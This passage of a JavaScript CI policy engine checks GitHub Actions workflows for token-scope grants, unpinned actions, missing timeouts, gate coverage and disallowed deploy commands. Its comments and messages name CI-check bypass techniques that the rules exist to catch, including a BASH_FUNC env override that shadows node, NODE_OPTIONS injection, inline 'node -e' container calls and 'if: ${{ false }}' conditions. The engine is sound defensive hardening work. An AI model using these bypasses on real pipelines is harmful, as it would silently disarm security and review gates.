          `${path}: jobs.${DEPLOY_JOB}.steps.${index}.env re-declares \`${variable}\`. It is declared once, on the job, precisely so that the preflight and the boot cannot be looking at different stacks; a step that re-points it is that divergence with the job-level declaration still in place to reassure the reader.`,
        );
      }
    }
    if (typeof step.uses === 'string') {
      const action = step.uses.split('@')[0];
      if (!DEPLOY_ACTIONS.includes(action)) {
        add(
          'compose-through-one-entrypoint',
          `${path}: jobs.${DEPLOY_JOB}.steps.${index} uses \`${action}\`, which is not one of the actions this job may run (${DEPLOY_ACTIONS.map((name) => `\`${name}\``).join(', ')}). An action is a program with the same reach as a \`run:\` step and one more capability: \`core.exportVariable\` writes \`$GITHUB_ENV\`, so an action can set \`NODE_OPTIONS\` for every later step and disarm every assertion in this job without a line of YAML that says so. If the work belongs to this deployment, it belongs in a \`scripts/ci/*.mjs\` file the ledger can run.`,
        );
      }
      continue;
    }
    if (typeof step.run !== 'string') continue;
    // A step the shape rule already refuses is refused; naming it twice would
    // make every `false && node …` mutation trip two rules, and "each mutation
    // fires exactly its own rule" is what makes the self-test's purity check
    // mean anything. `protected-steps-run-one-command` owns *is it one
    // unconditional command*; this owns *which command*.
    if (singleCommandProblems(step.run).length > 0) continue;
    for (const command of parseScript(step.run).commands) {
      for (const { name } of command.assignments) {
        if (COMPOSE_VARIABLES.includes(name)) {
          add(
            'compose-through-one-entrypoint',
            `${path}: jobs.${DEPLOY_JOB}.steps.${index}.run sets \`${name}\` for one command. Same divergence as a step \`env:\`, one line shorter: the assertions before and after it resolve a different stack from the one this command touches.`,
          );
        }
      }
      if (deployEntrypoint(command) !== null) continue;
      add(
        'compose-through-one-entrypoint',
        `${path}: jobs.${DEPLOY_JOB}.steps.${index}.run runs \`${command.raw.join(' ')}\`, which is not one of the entrypoints this job may use: ${DEPLOY_ENTRYPOINTS.map(({ describe }) => describe).join(', or ')}. This is an allowlist because the previous version was a list of binaries — \`docker\`, \`docker-compose\`, \`sh -c\` — and a blind review walked past it three ways in one line each: standalone \`compose\`, \`podman compose\`, and \`node -e\` with an inline \`execFileSync("docker", ["compose", …])\`. Anything that can reach a container runtime carries its own \`-f\` list, and a second file list is one the preflight, the image record and every assertion here cannot see. Put the work in a \`scripts/ci/*.mjs\` file, which resolves the list from ATRIUM_COMPOSE_FILES through \`composeArgs()\` like everything else in this job — and give it a mutation in \`deploy-mutation-ledger.mjs\`, which classifies stages with this same list.`,
      );
    }
  }
}

function isPlainObject(value) {
  return typeof value === 'object' && value !== null && !Array.isArray(value);
}

/**
 * Collects violations, refusing any rule id not declared in RULES. A rule the
 * self-test has never heard of is a rule nobody has proved fires.
 */
function makeAdd(violations, path) {
  return (rule, message, detail = {}) => {
    if (!RULES.includes(rule)) {
      throw new Error(
        `workflow-policy: undeclared rule id "${rule}". Add it to RULES and give it a mutation in workflow-policy-selftest.mjs.`,
      );
    }
    violations.push({ rule, message, path, ...detail });
  };
}

/** Depth-first walk yielding [pathSegments, key, value] for every mapping key. */
function* walkKeys(node, path = []) {
  if (Array.isArray(node)) {
    for (const [index, item] of node.entries()) yield* walkKeys(item, [...path, index]);
    return;
  }
  if (!isPlainObject(node)) return;
  for (const [key, value] of Object.entries(node)) {
    yield [path, key, value];
    yield* walkKeys(value, [...path, key]);
  }
}

function pathString(path, key) {
  return [...path, key].join('.');
}

/**
 * The `GITHUB_TOKEN` scopes a job in this repository may hold, as an allowlist.
 *
 * ── THE DEFECT (#40 round 7) ────────────────────────────────────────────────
 * `least-privilege` read `workflow.permissions.contents === 'read'` and stopped.
 * In GitHub Actions a job-level `permissions:` block **replaces** the workflow
 * default entirely rather than narrowing it, so
 *
 *     deploy:
 *       permissions: { contents: write, packages: write }
 *
 * was policy-clean against the engine as committed — `node
 * scripts/ci/workflow-policy.mjs .github/workflows` exited 0 and all 182
 * self-test mutations still passed — while the job that builds and runs
 * container images held a token that can push to this repository and to its
 * package registry. The rule's own sentence, "so a job inherits nothing it did
 * not ask for", was unenforced at exactly the level where the asking happens.
 *
 * ── WHY AN ALLOWLIST, NOT A LIST OF BAD SCOPES ──────────────────────────────
 * The same argument as `DECLARED_VARIABLES`, `NODE_FLAGS_ALLOWED` and the
 * launcher table before it: GitHub adds permission scopes, and a denylist of the
 * dangerous ones is a list that is complete until the next release note.
 * `attestations`, `models` and `id-token` all arrived after this file was first
 * written. So: every value must be `read` or `none`, and the only scope that may
 * be granted `read` is `contents` — everything this repository's CI does is read
 * its own source. A job may also omit `permissions:` entirely and inherit the
 * workflow default, which this file pins to `contents: read`.
 *
 * The string forms are refused outright. `permissions: write-all` grants write
 * on every scope; `permissions: read-all` grants read on scopes this workflow
 * never reads (`actions`, `packages`, `id-token`) and cannot be narrowed,
 * because the string form has no room to say `contents` and only `contents`.
 * `permissions: {}` is admissible and means the opposite — no scopes at all —
 * which is why the check is over the entries rather than over the key.
 *
 * What this does *not* claim: a token's scopes are not the only reach a job has.
 * A step can carry its own credentials in `secrets`, and `deploy` runs container
 * images that talk to the network. This rule bounds the ambient
 * `GITHUB_TOKEN`, which is the thing GitHub hands every job whether it asked or
 * not, and says nothing about the rest.
 *
 * @param {unknown} value the `permissions:` value, from any level
 * @returns {string[]} problems, each a sentence beginning mid-line
 */
const PERMISSION_VALUES = new Set(['read', 'none']);
const READABLE_SCOPE = 'contents';

function permissionProblems(value) {
  if (typeof value === 'string') {
    return [
      `is the string form \`permissions: ${value}\`, which sets every scope at once: \`write-all\` grants write on all of them and \`read-all\` grants read on scopes this workflow never reads. Write the mapping out — \`contents: read\`, and nothing else.`,
    ];
  }
  if (!isPlainObject(value)) {
    return [
      `is \`${JSON.stringify(value) ?? String(value)}\`, which is neither the mapping form nor a value this rule knows how to read. An unrecognised shape is refused rather than skipped: a \`permissions:\` key whose value nothing here understands is a token grant nothing here has bounded.`,
    ];
  }
  const problems = [];
  for (const [scope, granted] of Object.entries(value)) {
    if (!PERMISSION_VALUES.has(granted)) {
      problems.push(
        `grants \`${scope}: ${granted}\`, and every scope in this workflow must be \`read\` or \`none\`. Nothing this repository's CI does writes through the \`GITHUB_TOKEN\`: it reads its own source, runs its own tests, and reports through the check that needed it.`,
      );
      continue;
    }
    if (granted === 'read' && scope !== READABLE_SCOPE) {
      problems.push(
        `grants \`${scope}: read\`, and \`${READABLE_SCOPE}\` is the only scope this workflow reads. This is an allowlist rather than a list of scopes somebody decided were dangerous, because GitHub keeps adding scopes — \`attestations\`, \`models\` and \`id-token\` all postdate the first version of this rule — and a denylist is complete until the next release note.`,
      );
    }
  }
  return problems;
}

/** `always()`, `${{ always() }}`, `${{always()}}` all mean the same thing. */
function normalizeCondition(value) {
  return String(value)
    .trim()
    .replace(/^\$\{\{\s*/, '')
    .replace(/\s*\}\}$/, '')
    .trim();
}

/**
 * @param {string} source raw workflow YAML
 * @param {string} path file path, for messages
 * @returns {{rule: string, message: string}[]} every violation found
 */
export function checkWorkflow(source, path = '<workflow>') {
  const violations = [];
  const add = makeAdd(violations, path);

  const doc = parseDocument(source, { merge: false, strict: true });
  for (const error of doc.errors) {
    add('yaml-parse', `${path} is not valid YAML: ${error.message}`);
  }
  if (doc.errors.length > 0) return violations;

  // Anchors and aliases: GitHub does not support them, and a policy that reads
  // the expanded tree while a human reads the anchor is a policy nobody can
  // audit. Ban both outright.
  visit(doc, (_key, node) => {
    if (isAlias(node)) {
      add('no-yaml-alias', `${path}: YAML alias *${node.source} — aliases are not allowed.`);
    } else if (isCollection(node) && node.anchor) {
      add('no-yaml-anchor', `${path}: YAML anchor &${node.anchor} — anchors are not allowed.`);
    }
  });

  const workflow = doc.toJS({ maxAliasCount: -1 }) ?? {};
  // YAML 1.1 readers fold a bare `on` into boolean true. We parse as 1.2 (where
  // it stays a string), but accept both so the rule can never be dodged by a
  // schema quirk.
  const triggers = workflow.on ?? workflow.true ?? workflow[true];
  const jobs = isPlainObject(workflow.jobs) ? workflow.jobs : {};

  // ---- rules that apply to any key, at any depth -------------------------
  for (const [keyPath, key, value] of walkKeys(workflow)) {
    const where = pathString(keyPath, key);

    if (key === 'continue-on-error') {
      add(
        'no-continue-on-error',
        `${path}: \`continue-on-error\` at ${where}. A step allowed to fail is a gate that does not gate.`,
      );
    }

    if (key === 'shell') {
      add(
        'no-shell-override',
        // The runner's default for a step with no \`shell:\` key is \`bash -e
        // <file>\` — `-e` and nothing else. Round 4 wrote `bash -e -o pipefail`
        // here and in ci.yml, which is what `shell: bash` asks for; the ledger
        // (`RUNNER_SHELL = ['bash', '-e']`) had it right, so the two halves of
        // the verification stack disagreed in prose about the shell they claim
        // to share.
        `${path}: \`shell: ${value}\` at ${where}. The runner's default for a step with no \`shell:\` key — \`bash -e <file>\` — is the only shell allowed; an override can drop the \`-e\` that makes a failing command fail the step, and \`deploy-mutation-ledger.mjs\` re-executes these scripts under exactly that shell, so an override also makes its receipt about a different execution.`,
      );
    }

    if (key === 'if') {
      classifyCondition(keyPath, value, where, add, path);
    }

    // Where and in what a step runs — see RUNTIME_KEYS. Checked at every depth,
    // for the reason `shell` is: a key that means the same thing on a workflow,
    // a job and a step is a key that has to be refused in all three places, and
    // round 4's `uses:` guard was written for one job only.
    if (Object.hasOwn(RUNTIME_KEYS, key)) {
      const { allowed, why } = RUNTIME_KEYS[key];
      // `runs-on: [ubuntu-latest]` is the documented list form of the same
      // label and means exactly the same machine. Refusing it would be a false
      // red on a legitimate spelling, which is how rules get deleted; a list of
      // *two* labels is a runner selected by capability rather than by name and
      // is refused, along with the `{group:…, labels:…}` object form.
      const asked = Array.isArray(value) && value.length === 1 ? value[0] : value;
      if (!allowed.includes(asked)) {
        add(
          'no-runtime-override',
          `${path}: \`${key}: ${typeof value === 'object' ? JSON.stringify(value) : value}\` at ${where}. ${allowed.length === 0 ? `\`${key}\` may not appear in this workflow at all` : `\`${key}\` may only be ${allowed.map((one) => `\`${one}\``).join(' or ')}`} — ${why}. Two verifiers that disagree about *where* a command ran is the same defect as two that disagree about whether it ran.`,
        );
      }
    }

    // A container action is an image with an entrypoint, and `pin-actions-to-sha`
    // deliberately skips `docker://` refs, so nothing else in this file looks at
    // one. Same clause, one line: a step may not bring its own runtime.
    if (key === 'uses' && DOCKER_USES.test(String(value))) {
      add(
        'no-runtime-override',
        `${path}: \`uses: ${value}\` at ${where} is a container action — an image with an entrypoint, run in place of a step. ${RUNTIME_KEYS.container.why}.`,
      );
    }

    if (key === 'timeout-minutes' && keyPath.at(-2) === 'steps') {
      add(
        'no-step-timeout',
        `${path}: step-level \`timeout-minutes\` at ${where}. A per-step timeout turns a hung test suite into a red step that a later edit can mask; the job-level timeout already fails the whole job closed.`,
      );
    }

    if (key === 'run' && typeof value === 'string') {
      for (const { pattern, label } of FAIL_OPEN_SHELL) {
        if (pattern.test(value)) {
          add('no-fail-open-shell', `${path}: ${label} in the script at ${where}.`);
        }
      }
      if (INJECTABLE_CONTEXT.test(value)) {
        add(
          'no-untrusted-interpolation',
          `${path}: attacker-controllable \`github.event\` context interpolated into the script at ${where}. Pass it through \`env:\` instead.`,
        );
      }
      checkCommandShadowing(value, where, add, path);
    }

    // `env: { PATH: … }` is a PATH assignment this rule claimed to ban and did
    // not, because it only ever read `run:` scripts. GitHub applies it to the
    // step, the job or the whole workflow depending on where it sits, so it is
    // the same bypass as `export PATH=…` with a longer reach and no shell.
    // Round 4 widened it from PATH to every variable in INJECTING_VARIABLES —
    // see that table for why `NODE_OPTIONS` belongs beside it.
    // Round 5 inverted it again, from "the injecting variables" to "the
    // variables this workflow declares" — see DECLARED_VARIABLES for why a
    // denylist here could not be finished. `BASH_FUNC_node%%: "() { return 0; }"`
    // is a legal YAML key and was clean against round 4.
    if (key === 'env' && isPlainObject(value)) {
      for (const name of Object.keys(value)) {
        const problem = variableProblem(String(name));
        if (problem !== undefined) {
          add(
            'no-command-shadowing',
            `${path}: \`env:\` at ${where} sets \`${name}\`. ${problem} Set it nowhere, or invoke the binary by its full path with the flags written in the step.`,
          );
        }
      }
    }
  }

  // ---- triggers ----------------------------------------------------------
  const triggerNames = isPlainObject(triggers)
    ? Object.keys(triggers)
    : Array.isArray(triggers)
      ? triggers.map(String)
      : triggers
        ? [String(triggers)]
        : [];
  for (const required of REQUIRED_TRIGGERS) {
    if (!triggerNames.includes(required)) {
      add(
        'required-triggers',
        `${path}: missing the \`${required}\` trigger. A merge queue that never gets a run treats the absence of a verdict as consent.`,
      );
    }
  }

  // ---- permissions -------------------------------------------------------
  //
  // The workflow-level block is the *default*, and a job-level block replaces it
  // wholesale — see `permissionProblems` for the measurement. Both are checked
  // against the same allowlist; only this one is additionally required to exist
  // and to say `contents: read`, because a workflow with no `permissions:` at
  // all inherits whatever the repository's default is, which is not a property of
  // this file.
  if (!isPlainObject(workflow.permissions) || workflow.permissions.contents !== 'read') {
    add(
      'least-privilege',
      `${path}: workflow-level \`permissions:\` must declare \`contents: read\` so a job inherits nothing it did not ask for.${
        typeof workflow.permissions === 'string'
          ? ` \`permissions: ${workflow.permissions}\` is the string form, which sets every scope at once and cannot say \`contents\` and only \`contents\`.`
          : ''
      }`,
    );
  } else {
    for (const problem of permissionProblems(workflow.permissions)) {
      add(
        'least-privilege',
        `${path}: workflow-level \`permissions:\` ${problem} This is the default every job in the file inherits, so a scope granted here is a scope granted to all of them.`,
      );
    }
  }

  // ---- actions are pinned to commit SHAs ---------------------------------
  //
  // ── WHY THE PARSED TREE DECIDES, AND THE LINES ONLY SUPPLY THE COMMENT ────
  // Round 1 wrote this as a scan of raw lines, because the `# vN.N.N` comment
  // it also requires is not in the parsed document at all — YAML comments are
  // not data. Four rounds later a blind cross-lineage review pointed out what
  // that costs, and it is the whole rule:
  //
  //     - { name: Checkout, uses: actions/checkout@v4 }
  //
  // is a legal YAML flow mapping, GitHub runs it, `USES_LINE` does not match
  // it, and the policy reported **clean** — a mutable tag on the action that
  // checks out the code, in a file whose first paragraph is about pinning.
  // Every `uses:` in a workflow this engine has been guarding since round 1
  // could have been written that way.
  //
  // So the parsed tree is now what enumerates the actions — it cannot be
  // spelled around, because it is what GitHub reads — and the line scan is
  // demoted to a lookup table for the comment beside each ref. A `uses:` the
  // line scan never saw is refused *for that reason*: not because the comment
  // is missing, but because it is written where the comment cannot be.
  const commentFor = new Map();
  /** Refs that have already spent one of their comments, for the message. */
  const seen = new Set();
  for (const line of source.split('\n')) {
    const match = USES_LINE.exec(line);
    if (!match) continue;
    // `uses: "actions/checkout@<sha>" # v7.0.1` is legal YAML and the parsed
    // value carries no quotes, so keeping them here made the two halves
    // disagree about the same step — a false red found by a blind review.
    const ref = match[1].replace(/^(['"])(.*)\1$/, '$2');
    if (!commentFor.has(ref)) commentFor.set(ref, []);
    commentFor.get(ref).push(match[2]);
  }
  for (const [keyPath, key, value] of walkKeys(workflow)) {
    if (key !== 'uses' || typeof value !== 'string') continue;
    const ref = value.trim();
    const at = `${path}: ${pathString(keyPath, key)}`;
    if (LOCAL_USES.test(ref) || DOCKER_USES.test(ref)) continue;
    if (!PINNED_USES.test(ref)) {
      add(
        'pin-actions-to-sha',
        `${at}: \`uses: ${ref}\` is not pinned to a 40-character commit SHA. A tag is mutable; whoever can move it can run code here.`,
      );
      continue;
    }
    // One comment per *occurrence*, consumed as it is used. Indexing by ref
    // alone let a second, uncommented occurrence of an already-commented action
    // borrow the first one's comment — which is how `- { name: Checkout, uses:
    // actions/checkout@<the real sha> }` came back clean, found by a blind
    // review of the fix two commits earlier.
    const comments = commentFor.get(ref) ?? [];
    if (comments.length === 0) {
      add(
        'pin-actions-to-sha',
        seen.has(ref)
          ? `${at}: \`uses: ${ref}\` has no \`# vN.N.N\` comment of its own — the source lines carrying that ref are all spoken for by earlier occurrences. Every occurrence needs its own: one comment cannot vouch for two steps, and indexing them by ref alone is how a flow-mapping \`uses:\` borrowed a twin's comment and came back clean.`
          : `${at}: \`uses: ${ref}\` is not written as a \`uses:\` line of its own, so the \`# vN.N.N\` comment this rule requires has nowhere to live and nothing here can read it. A YAML flow mapping — \`- { name: Checkout, uses: … }\` — is what this looked like before the parsed tree became the authority, and for four rounds it was clean with a mutable tag.`,
      );
      continue;
    }
    seen.add(ref);
    const commented = comments.findIndex((one) => one && VERSION_COMMENT.test(one));
    if (commented === -1) {
      add(
        'pin-actions-to-sha',
        `${at}: \`uses: ${ref}\` needs a trailing \`# vN.N.N\` comment recording which release the SHA is, so the pin stays auditable. Every occurrence needs its own: one comment cannot vouch for two steps.`,
      );
      continue;
    }
    comments.splice(commented, 1);
  }

  // ---- every job is bounded, and defined here -----------------------------
  for (const [jobId, job] of Object.entries(jobs)) {
    if (!isPlainObject(job)) continue;
    // A job-level `permissions:` block replaces the workflow default rather than
    // narrowing it, so the workflow-level check above says nothing at all about
    // a job that declares its own. See `permissionProblems`: `permissions:
    // {contents: write, packages: write}` on `deploy` was policy-clean.
    if (Object.hasOwn(job, 'permissions')) {
      for (const problem of permissionProblems(job.permissions)) {
        add(
          'least-privilege',
          `${path}: job \`${jobId}\` declares \`permissions:\` that ${problem} A job-level block *replaces* the workflow default rather than narrowing it, so \`contents: read\` at the top of this file constrains nothing here. Delete the block and inherit the default, or write one this rule can read.`,
        );
      }
    }
    const minutes = job['timeout-minutes'];
    if (typeof minutes !== 'number') {
      add(
        'job-timeout-required',
        `${path}: job \`${jobId}\` has no \`timeout-minutes\`. A job that can hang forever is a check that never reports.`,
      );
    } else if (!Number.isInteger(minutes) || minutes < 1 || minutes > MAX_JOB_TIMEOUT_MINUTES) {
      // ── A NUMBER IS PRESENT, A BOUND IS NOT (#40 round 7) ────────────────
      // The check above was `typeof … !== 'number'`, so `timeout-minutes: 4320`
      // — three days, GitHub's own maximum for a job — satisfied it, and so did
      // `0` and `-1`. "A job that can hang forever is a check that never
      // reports" is the sentence this rule is written under, and a job that
      // hangs for three days is that sentence with a receipt at the end of it:
      // the merge queue is blocked, the runner minutes are spent, and nobody
      // waits three days to find out. The ceiling is a real bound or it is a
      // type check wearing a bound's name.
      add(
        'job-timeout-required',
        `${path}: job \`${jobId}\` declares \`timeout-minutes: ${minutes}\`, which is not a whole number of minutes between 1 and ${MAX_JOB_TIMEOUT_MINUTES}. ${
          minutes > MAX_JOB_TIMEOUT_MINUTES
            ? `The three jobs in this file take 20, 20 and 30 minutes and the gate takes 5, so ${MAX_JOB_TIMEOUT_MINUTES} is roughly twice the slowest of them — room for a bad day on a cold cache, and nowhere near GitHub's own 4320-minute maximum, which is three days of a blocked merge queue nobody is going to wait out. Raising the ceiling is an edit to this file with a reason beside it, which is the point.`
            : 'A timeout must be a positive whole number of minutes: `0` and negatives are not "no limit", they are a bound nobody can act on, and a fractional value is a spelling GitHub does not document.'
        }`,
      );
    }
    // A reusable workflow moves the job body somewhere this engine cannot read
    // it. For a remote one that body is a different repository's file, on a ref
    // whose contents can change without a commit here — the policy would be
    // enforcing rules over a stub while the real steps ran elsewhere. Refused
    // outright, local ones included, so that adopting one is a deliberate edit
    // to this rule rather than a quiet hole. (Round-2 receipt: none are used
    // today; this converts the gap into a loud choice.)
    if (job.uses !== undefined) {
      add(
        'no-remote-reusable-workflow',
        `${path}: job \`${jobId}\` delegates to the reusable workflow \`${job.uses}\`. Reusable workflows are refused: their steps are not in this file, so nothing here can check them, and a remote one can change without a commit to this repository. Inline the job.`,
      );
    }
    if (job.secrets !== undefined) {
      add(
        'no-remote-reusable-workflow',
        `${path}: job \`${jobId}\` passes \`secrets:\` to a called workflow. Only reusable-workflow calls take that key, and those are refused.`,
      );
    }
  }

  // ---- the checks themselves must still be wired up -----------------------
  for (const [jobId, required] of Object.entries(REQUIRED_STEPS)) {
    const job = jobs[jobId];
    if (!isPlainObject(job)) {
      add(
        'required-job-steps',
        `${path}: no \`${jobId}\` job. The gates this repo relies on are declared per job in scripts/ci/workflow-policy.mjs; a workflow without \`${jobId}\` is missing ${required.length} of them.`,
      );
      continue;
    }
    const scripts = jobStepScripts(job);
    // Every index that matches, not the first one. Round 4 used `findIndex` on
    // both halves of a pair, which answers "is there a match somewhere" and then
    // silently assumes the first match is the one that matters. That is fine
    // while each pattern occurs once and wrong the moment one does not: a step
    // that appears twice has its second occurrence judged by the first one's
    // position. The satisfying prerequisite is now located per occurrence.
    const indicesOf = (test) => scripts.flatMap((step, index) => (test.test(step) ? [index] : []));

    for (const { rule, what, test, requires = [] } of required) {
      const stepIndices = indicesOf(test);
      if (stepIndices.length === 0) {
        add(
          rule,
          `${path}: job \`${jobId}\` never runs ${what} (nothing in its steps matches ${test}). A job can satisfy every other rule here and still prove nothing by quietly dropping the step that does the proving.`,
        );
        continue;
      }
      // The step is here. Everything it silently depends on had better be here
      // too, and earlier — a gate whose setup is gone does not fail, it drifts.
      for (const prerequisite of requires) {
        const pair = { job: jobId, step: what, needs: prerequisite.what };
        const prerequisiteIndices = indicesOf(prerequisite.test);
        if (prerequisiteIndices.length === 0) {
          add(
            'required-step-prerequisites',
            `${path}: job \`${jobId}\` runs ${what} but never runs ${prerequisite.what}, which it depends on (nothing matches ${prerequisite.test}). ${prerequisite.because}. A gate that still runs with its setup deleted is worse than a deleted gate: it reports.`,
            { pair },
          );
          continue;
        }
        // Each occurrence of the step needs *some* occurrence of its setup in
        // front of it. Report the first one that has none.
        const unsatisfied = stepIndices.find(
          (stepIndex) => !prerequisiteIndices.some((before) => before < stepIndex),
        );
        if (unsatisfied !== undefined) {
          add(
            'required-step-prerequisites',
            `${path}: job \`${jobId}\` runs ${what} at step ${unsatisfied} but the earliest ${prerequisite.what} is step ${prerequisiteIndices[0]}, i.e. afterwards. ${prerequisite.because}. Order the pair, or the earlier step is decoration.`,
            { pair },
          );
        }
      }
    }
  }

  // ---- the protected steps are canonical, and compose is resolved once ----
  checkProtectedStepShape(jobs, path, add);
  checkManagerSelection(jobs, path, add);
  checkComposeEntrypoint(jobs, path, add);
  for (const problem of protectedCommandCoverage(jobs)) {
    add('protected-commands-cover-the-verbs', `${path}: ${problem}`);
  }

  // ---- the gate ----------------------------------------------------------
  const gate = jobs[GATE_JOB];
  if (!isPlainObject(gate)) {
    add(
      'gate-covers-all-jobs',
      `${path}: no \`${GATE_JOB}\` job. Every workflow needs exactly one job that fails unless all the others succeeded — it is the only check that may be marked required.`,
    );
  } else {
    const needs = Array.isArray(gate.needs) ? gate.needs : gate.needs ? [String(gate.needs)] : [];
    const others = Object.keys(jobs).filter((id) => id !== GATE_JOB);
    const uncovered = others.filter((id) => !needs.includes(id));
    if (uncovered.length > 0) {
      add(
        'gate-covers-all-jobs',
        `${path}: job(s) ${uncovered.map((id) => `\`${id}\``).join(', ')} are not in \`${GATE_JOB}.needs\`. A job the gate does not need is a job whose failure nothing reports.`,
      );
    }
    for (const need of needs) {
      if (!Object.hasOwn(jobs, need)) {
        add(
          'gate-covers-all-jobs',
          `${path}: \`${GATE_JOB}.needs\` names \`${need}\`, which is not a job in this file.`,
        );
      }
    }
    if (normalizeCondition(gate.if ?? '') !== 'always()') {
      add(
        'gate-runs-always',
        `${path}: \`${GATE_JOB}\` must declare \`if: always()\`. Without it the gate is skipped whenever a needed job is skipped or fails, and GitHub reports a skipped required check as success.`,
      );
    }
    checkGateInspectsNeeds(gate, path, add);
  }

  return violations;
}

/**
 * One script per step, in order.
 *
 * Round 3 flattened the whole job into a single string, which answers "is this
 * mentioned anywhere" and nothing else. Prerequisites are a question about
 * *order*, so the steps have to stay separate: a report reset that happens after
 * the run it is supposed to precede reads exactly like one that happens before
 * it, once the newlines are gone.
 */
function jobStepScripts(job) {
  const steps = Array.isArray(job.steps) ? job.steps : [];
  return steps.map((step) => (isPlainObject(step) ? `${step.run ?? ''}\n${step.uses ?? ''}` : ''));
}

/**
 * The gate must actually read the results it needs — parsed, not grepped.
 *
 * Round 2 checked this with `JSON.stringify(gate).includes('toJSON(needs)')`,
 * which a comment containing that string satisfies just as well as a working
 * gate. So: find the step that binds `${{ toJSON(needs) }}` into an environment
 * variable, then read the script that step runs and require it to read that
 * variable, iterate it, look at each job's `result`, compare against the
 * literal `success`, exit non-zero when one is not, and refuse an empty `needs`
 * rather than passing by vacuous truth. gate-selftest.mjs then extracts that
 * same script and *runs* it against synthetic `needs` payloads, which is the
 * only check that can tell working code from convincing code.
 */
function checkGateInspectsNeeds(gate, path, add) {
  const steps = Array.isArray(gate.steps) ? gate.steps : [];
  let bound;
  for (const step of steps) {
    if (!isPlainObject(step) || typeof step.run !== 'string') continue;
    const env = isPlainObject(step.env) ? step.env : {};
    const entry = Object.entries(env).find(([, value]) =>
      /toJSON\s*\(\s*needs\s*\)/.test(String(value)),
    );
    if (entry) {
      bound = { name: entry[0], run: step.run };
      break;
    }
  }

  if (bound === undefined) {
    add(
      'gate-inspects-needs',
      `${path}: no step in \`${GATE_JOB}\` binds \`\${{ toJSON(needs) }}\` into an \`env:\` variable and then reads it. The gate must inspect every needed job's \`result\` and fail unless each one is literally \`success\`.`,
    );
    return;
  }

  const { name, run } = bound;
  const readsVariable = new RegExp(
    `process\\.env\\.${name}\\b|process\\.env\\[\\s*["']${name}["']\\s*\\]|\\$\\{?${name}\\b`,
  );
  const checks = [
    { ok: readsVariable.test(run), why: `never reads the \`${name}\` variable it binds` },
    {
      ok: /Object\.(entries|values|keys)\s*\(|\bfor\s*\(|\.map\s*\(|\.filter\s*\(/.test(run),
      why: 'never iterates the needed jobs, so it can only be looking at one of them (or none)',
    },
    { ok: /\bresult\b/.test(run), why: "never looks at any job's `result`" },
    {
      ok: /["']success["']/.test(run),
      why: 'never compares a result against the literal `success`, so `skipped` and `cancelled` would read as fine',
    },
    {
      ok: /process\.exit\s*\(\s*[1-9]|\bexit\s+[1-9]/.test(run),
      why: 'never exits non-zero, so whatever it finds it reports green',
    },
    {
      ok: /length\s*(?:===?|<)\s*[01]\b/.test(run),
      why: 'does not fail on an empty `needs`, so a gate quietly emptied of its dependencies would pass by vacuous truth',
    },
  ];
  for (const { ok, why } of checks) {
    if (!ok) {
      add(
        'gate-inspects-needs',
        `${path}: the \`${GATE_JOB}\` step that binds \`toJSON(needs)\` ${why}.`,
      );
    }
  }
}

/** `if:` is allowed in exactly two places; everything else is a verdict in disguise. */
function classifyCondition(keyPath, value, where, add, path) {
  const condition = normalizeCondition(value);
  const [root, jobId, maybeSteps] = keyPath;

  const isJobLevel = root === 'jobs' && keyPath.length === 2;
  const isStepLevel = root === 'jobs' && maybeSteps === 'steps' && keyPath.length === 4;

  if (isJobLevel) {
    if (jobId === GATE_JOB) return; // checked separately: must be always()
    add(
      'no-job-condition',
      `${path}: \`if: ${value}\` on job \`${jobId}\`. GitHub reports a skipped required check as *success*, so a condition on a gating job is a bypass — this is the exact hole \`if: \${{ false }}\` opens.`,
    );
    return;
  }

  if (isStepLevel) {
    // `failure()` is provisionally allowed here; checkConditionalStepsAreUploads
    // then proves the step it sits on is an artifact upload and nothing else.
    if (condition === 'failure()') return;
    add(
      'no-step-condition',
      `${path}: \`if: ${value}\` at ${where}. The only step condition allowed is \`if: failure()\` on an artifact upload — a condition on anything else lets a gate decline to run and still report green.`,
    );
    return;
  }

  add(
    'no-stray-condition',
    `${path}: \`if: ${value}\` at ${where}, which is not a place a condition belongs.`,
  );
}

/** Steps carrying `if: failure()` must be artifact uploads and nothing else. */
export function checkConditionalStepsAreUploads(workflow, path, add) {
  const jobs = isPlainObject(workflow.jobs) ? workflow.jobs : {};
  for (const [jobId, job] of Object.entries(jobs)) {
    if (!isPlainObject(job) || !Array.isArray(job.steps)) continue;
    for (const [index, step] of job.steps.entries()) {
      if (!isPlainObject(step) || step.if === undefined) continue;
      const uses = String(step.uses ?? '');
      if (!uses.startsWith('actions/upload-artifact@')) {
        add(
          'no-step-condition',
          `${path}: jobs.${jobId}.steps.${index} carries \`if:\` but is not an \`actions/upload-artifact\` step. Conditions may gate artifacts, never verdicts.`,
        );
      }
    }
  }
}

/** Runs both passes over one file. */
export function checkWorkflowFile(source, path) {
  const violations = checkWorkflow(source, path);
  const doc = parseDocument(source, { merge: false, strict: true });
  if (doc.errors.length === 0) {
    checkConditionalStepsAreUploads(
      doc.toJS({ maxAliasCount: -1 }) ?? {},
      path,
      makeAdd(violations, path),
    );
  }
  return violations;
}

/**
 * Every workflow file under a path, whether that path is a file or a directory.
 *
 * `.yaml` as well as `.yml`, because GitHub runs both and round 5's invocation
 * globbed only the first — a `.github/workflows/x.yaml` was invisible to every
 * rule in this engine. Enumerating the directory here rather than in the shell
 * also means the set is decided by something that can be tested, and that an
 * empty directory is a failure instead of a green run over nothing.
 *
 * @param {string} path
 * @returns {string[]} sorted, or `[path]` when it is a file
 */
export function workflowFiles(path, stat = statSync, list = readdirSync) {
  let entry;
  try {
    entry = stat(path);
  } catch (error) {
    throw new Error(`${path} cannot be read (${error.message}).`);
  }
  if (!entry.isDirectory()) return [path];
  const base = path.replace(/\/+$/, '');
  return list(base, { withFileTypes: true })
    .filter(
      (child) =>
        // A symlink too. GitHub reads what the checkout materialises, and "the
        // entry happens to be a regular file today" is the same shape of
        // assumption as "the glob happens to name every extension".
        (child.isFile() || child.isSymbolicLink()) && /\.ya?ml$/.test(child.name),
    )
    .map((child) => `${base}/${child.name}`)
    .sort();
}

function main(argv) {
  const paths = argv.slice(2);
  if (paths.length === 0) {
    console.error(
      'usage: node scripts/ci/workflow-policy.mjs <.github/workflows|workflow.yml> [...]',
    );
    return 2;
  }
  let files;
  try {
    files = [...new Set(paths.flatMap((path) => workflowFiles(path)))];
  } catch (error) {
    console.error(`::error::Workflow policy: ${error.message}`);
    return 2;
  }
  if (files.length === 0) {
    console.error(
      `::error::Workflow policy: ${paths.join(', ')} contains no .yml or .yaml file. A policy engine that checks nothing and exits 0 is the failure it exists to prevent.`,
    );
    return 2;
  }
  let failed = 0;
  for (const file of files) {
